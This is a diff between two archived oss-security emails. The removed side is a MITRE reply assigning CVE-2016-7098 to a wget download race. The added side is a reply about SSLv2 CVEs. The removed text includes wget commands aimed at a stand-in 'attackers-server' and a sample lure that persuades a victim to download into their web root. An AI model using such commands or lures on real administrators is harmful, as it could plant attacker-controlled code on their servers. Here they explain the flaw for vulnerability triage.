@@ -1,144 +1,54 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/08/27/2
-Message-Id: <20160827190807.536C66C54F4@smtpvmsrv1.mitre.org>
-Date: Sat, 27 Aug 2016 15:08:07 -0400 (EDT)
-From: cve-assign@...re.org
-To: dmisra@...isign.com, dawid@...alhackers.com
-Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
-Subject: Re: CVE Request - Gnu Wget 1.17 - Design Error Vulnerability
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/03/02/4
+Message-ID: <CAComcpOd1_+qxMnTdJYLM2dP0W=E95Kn6OZ4yYuUS72EQLBpiQ@mail.gmail.com>
+Date: Tue, 1 Mar 2016 14:23:39 -0700
+From: Bob Beck <beck@...nbsd.org>
+To: oss-security@...ts.openwall.com
+Cc: kseifried@...hat.com, cve-assign@...re.org
+Subject: Re: Re: CVE's for SSLv2 support
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
-
-> Wget Race Condition Recursive Download Accesslist Race Condition Vulnerability
-
-Our perspective is that this is a very marginal issue for CVE
-inclusion. Exploitation requires the victim to specify a potentially
-dangerous file on the command line, and to enter this command line
-while the current working directory is served by a web server. Also,
-the observed behavior isn't directly inconsistent with the
-documentation. However, the vendor apparently recognizes some security
-risk and has decided to publish a patch described in the
-http://lists.gnu.org/archive/html/bug-wget/2016-08/msg00134.html post.
-
-Use CVE-2016-7098.
-
-> wget -r -nH -A '*.jpg' http://attackers-server/test.php
-
-Maybe a marginally realistic exploitation scenario is for the
-attacker to convey this message to potential victims:
-
-  I wrote a blog post about my summer vacation at
-  http://attackers-server/vacation.php - this has links to dozens
-  of photos that are .jpg files. If you have a slideshow application
-  on your own server and just want to look at my photos, a simple
-  method is to cd to your DocumentRoot directory, then cd to your
-  slideshow directory underneath that, and then type this command:
-
-     wget -r -nH -A '*.jpg' http://attackers-server/vacation.php
-
-This is only marginally realistic for the following reasons:
-
-  - It seems very odd to set one's working directory to a place
-    underneath DocumentRoot, and then run wget with an untrusted .php
-    URL on the command line - especially because the wget
-    documentation is ambiguous (see below).
-
-  - People don't ordinary ask their web-site visitors to create their
-    own alternative content views (e.g., slideshows) on the visitors'
-    web servers.
-
-  - People don't ordinarily expect their web-site visitors to feel
-    comfortable with wget commands. If they wanted to share a .jpg
-    collection, they would probably create a .zip of it.
-
-  - Although wget of an untrusted .php file with "-A '*.jpg'" might be
-    somewhat common, it is probably not common for this to occur
-    with a working directory under DocumentRoot. It seems to require
-    an obscure use case in which the victim wants to mirror the .jpg
-    files, but is willing to expend extra effort to host a unique web
-    presentation of those .jpg files, just because mirroring the
-    complete original presentation might be unsafe.
-
-> the victim server's security is impacted since the
-> developer/administrator was never warned explicitly that 'rejected
-> files' can have a transient life on the victim server
-
-The documentation only says "Specify comma-separated lists of file
-name suffixes or patterns to accept or reject" during the recursive
-retrieving. It does not discuss what happens to the filename that was
-explicitly entered on the command line (stored forever, stored
-temporarily, or never stored). It seems that, in many cases, a user
-would prefer that file to be stored forever, so that they don't have
-to create their own unique presentation. For example,
-
-   wget -r -nH -A '*.jpg' http://attackers-server/vacation.html
-
-can easily be interpreted to mean "I want to mirror the top-level
-presentation file vacation.html, and I also want to mirror every .jpg
-file that it references. I don't want a huge download time, so I've
-decided to accept only the .jpg files, and not the .mp3 files of
-birdsongs heard during the vacation, .mp4 movies of the birds, etc."
-Probably wget has never supported that, but still it might be the
-expected behavior.
+On Tue, Mar 1, 2016 at 12:12 PM,  <cve-assign@...re.org> wrote:
+> -----BEGIN PGP SIGNED MESSAGE-----
+> Hash: SHA256
+>
+>> If a crypto library (e.g. OpenSSL, NSS) supports AND enables SSLv2 by
+>> default should it receive a CVE?
+>
+> There's no general answer to that question. CVE ID assignments are not
+> based on outsiders making guesses about the expectations of a product's
+> customers. For example, there might be a crypto library intended for
+> communication on isolated networks to high-value embedded devices that
+> support only SSLv2, and cannot and will not ever be updated.
 
 
-> http://git.savannah.gnu.org/cgit/wget.git/commit/?id=9ffb64ba6a8121909b01e984deddce8d096c498d
-> http://git.savannah.gnu.org/cgit/wget.git/commit/?id=690c47e3b18c099843cdf557a0425d701fca4957
+What.. like... I have an embedded high value device that only supports
+TELNET to access it.. OMG please give me a CVE?
 
-Also, we're not sure how the 'asprintf (&tmp, "%s.tmp",
-hs->local_file);' is supposed to interact with
-http://httpd.apache.org/docs/current/mod/mod_mime.html#multipleext --
-file.php.tmp is not necessarily a safe naming convention.
-
-Finally, the patch does not address all possible security risks. For
-example, if the victim's working directory is under DocumentRoot and
-the victim is logged into the account used by the web server, then
-there is still a possibility of malicious content from a
-
-  wget -r -nH -A '*.jpg' http://attackers-server/vacation.html
-
-command (e.g., malicious JavaScript). There is no CVE ID for that.
+replace SSLV2 in the above sentence with telnet or ssh v1 for that
+matter and you have the same issue.
 
 
-> http://www.openwall.com/lists/oss-security/2016/08/12/7
-
-> We addressed this issue in wget2 - files just needed for parsing are kept in 
-> memory and never appear in the file system.
-
-Again, interpreting "-A '*.jpg' http://attackers-server/vacation.html"
-to mean no mirroring of vacation.html is a potential usability
-problem. Ideally, there might be separate options for the different
-use cases, e.g., something like
-
-  --also-accept-the-file-named-on-the-command-line
-
-or
-
-  --do-not-also-accept-the-file-named-on-the-command-line
-
-(but preferably with shorter option names!).
-
-- -- 
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQIcBAEBCAAGBQJXweQ3AAoJEHb/MwWLVhi2gLoQAJP6vGruKoD5iwKEUrLFCsGC
-0Dv8rApnGy+3atwQ84KlFIBsvcWcFpk5ttvqlhLZtRVft+qdlPKp6a5xQEDx51RZ
-qhV+LMBvCRXU1vJAKTRoJa3VwLYHTfGUj5nMT+rBgKqvcxXE+Xe9FYvHB+m+iLUk
-TFBRqVJRsWSNNkouOaCThoIoHuDDLX7W9WEn0PyAi2aNoxywOHjXVwuH32Zw7D96
-L8X4aN8Q54bdnpOc3jrO6RssgesNxpycZVvreXGIMR4/zM2xMmMegVr6RvQhLPe2
-J2xh5p0mq000W5zMo1Qic56TGAmyutGHhDSewcuax8VYBIar1zmLKHH13AMfpECR
-OKeNeFE1khi1xYQggm07KhCWGhORPD8HqF6GVQGZQh4nGRHyS2m3ePssSdL01RSg
-ZcJyOgPT8Bo8jk25i7t23RoTYXJQXLjtiMI4z28wXoxf43j6obzxHhFBHBEMNk9p
-1kJZvF5jMbJNywUVFbo5D5IWlsb51LeGo7Rzy4GOG3Mgcagv414RDEfh7167UC6i
-MuyZ+JgFHhEsaiyPyaxl+En4BxMiqhG/fvE0lo0SZ3omjj0t6soPqS+Vl8uQDdva
-VdT8VRdPMrR7+acdTjKQmhnkyOOXSYidRM7ToTCmd/VNSyZXzeuNEvDckUVSyyTS
-n8lsLYdoKuIH5H8NIJ8c
-=rqtj
------END PGP SIGNATURE-----
+>
+> - --
+> CVE assignment team, MITRE CVE Numbering Authority
+> M/S M300
+> 202 Burlington Road, Bedford, MA 01730 USA
+> [ PGP key available through http://cve.mitre.org/cve/request_id.html ]
+> -----BEGIN PGP SIGNATURE-----
+> Version: GnuPG v1
+>
+> iQIcBAEBCAAGBQJW1ekCAAoJEL54rhJi8gl5dQEQAK5x43W8Q157sNT4gUg8rQtS
+> U0UlnjmsT1S40FlNiwZpK5IPkE7hdeTeiWUoFMsvc13vtlfpwfHCBfb05B5fcQBP
+> 2b3ssj49aH5yXVxnGE2ab6W5c63wN2jkbBBihVBXZ8SB9h4tNNSey+7dJrLyMqi0
+> Um76Tv5htBbpm+6UtlgN7zV3tT9MIe6bZI/b7xxuf23nM8/mBvc1nX8dpCFF16og
+> ks9d9A1Rnn79xCvWZ++jR8PRlmFwmLym/PEQulJ6k4WQdOECH78ytYWg9MG7EuIg
+> 6PbKloy7u36+ZgrUXxYnydoH834H6yOQIPro7hARFA0fpkbmydBJKnP4letuVS5w
+> S89g15c2ymxIyKaKy+qT31LEKBGf+N6vPoPNL/IWeRh+8GmSyWkWF7Rx0CboFCTs
+> 7+Ft9T+0Lfi6bYkYqAFUVe8gBkM84tLR+4HXgkANLAfhLEsKaCYqAkNYlbDvCXtB
+> RyFZHcVhp8XYWx7b5YN3BBB5VWK/fS8y8ilHaf143Bkbn+Yu6yrFb+DIAYhKPPAI
+> 1CURZksBwzSSjiprsExD4dODDJGzl/0khHdkDkdZp7o9drt3D4VkKGgkBPoG5NFk
+> cX1XQc6o3Hv72oYFLyatCA5H8k9HZLEUjl8cYuf/QIvfwJwjlLqZ+HrPWvs2SY5C
+> K4C7mIXfd9Iem6DqXfNK
+> =ylcp
+> -----END PGP SIGNATURE-----
